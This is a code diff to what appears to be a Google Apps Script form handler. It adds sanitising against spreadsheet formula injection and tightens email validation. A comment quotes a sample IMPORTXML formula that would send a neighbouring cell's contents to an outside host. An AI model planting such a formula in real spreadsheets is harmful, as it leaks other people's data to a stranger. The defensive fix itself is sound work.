@@ -148,13 +148,27 @@ function json_(o) {
  * visitor tapping the button twice leaves you two rows to decide about, and
  * approving one while the other says pending is a state nobody can read.
  */
+/* A spreadsheet cell that starts with = + - or @ is a FORMULA the moment the
+   workbook is opened, not text. These rows carry what a stranger typed into a
+   public form, so a "name" of =IMPORTXML("https://theirs/"&B2,"//a") would run
+   in our workbook, with our access, and hand them the row next to it. A
+   leading apostrophe makes Sheets keep the value as text; it does not show in
+   the cell and it does not change what anybody reads. */
+function cell_(v) {
+  var s = String(v == null ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 function requestAccess_(b) {
   var name  = String(b.name || '').trim().replace(/\s+/g, ' ').slice(0, 80);
   var email = String(b.email || '').trim().toLowerCase().slice(0, 120);
   var org   = String(b.organisation || '').trim().replace(/\s+/g, ' ').slice(0, 120);
 
   if (!name) return json_({ ok: false, error: 'Please give your name.' });
-  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email))
+  /* Starts with a letter or a digit, so it can never be a spreadsheet
+     formula. An address is looked up by its exact value, so it is the one
+     field that cannot be made safe with a leading apostrophe. */
+  if (!/^[A-Za-z0-9][^@\s]*@[^@\s]+\.[^@\s]+$/.test(email))
     return json_({ ok: false, error: 'That does not look like an email address.' });
   if (b.consent !== true)
     return json_({ ok: false, error: 'Please agree to the note about your details.' });
@@ -170,7 +184,7 @@ function requestAccess_(b) {
     var sh = reqTab_();
     var found = findRow_(sh, email);
     if (found) return json_({ ok: true, already: true, status: found.status });
-    sh.appendRow([new Date(), name, email, org, 'pending', '', '', '', '', key]);
+    sh.appendRow([new Date(), cell_(name), email, cell_(org), 'pending', '', '', '', '', key]);
   } finally {
     lock.releaseLock();
   }
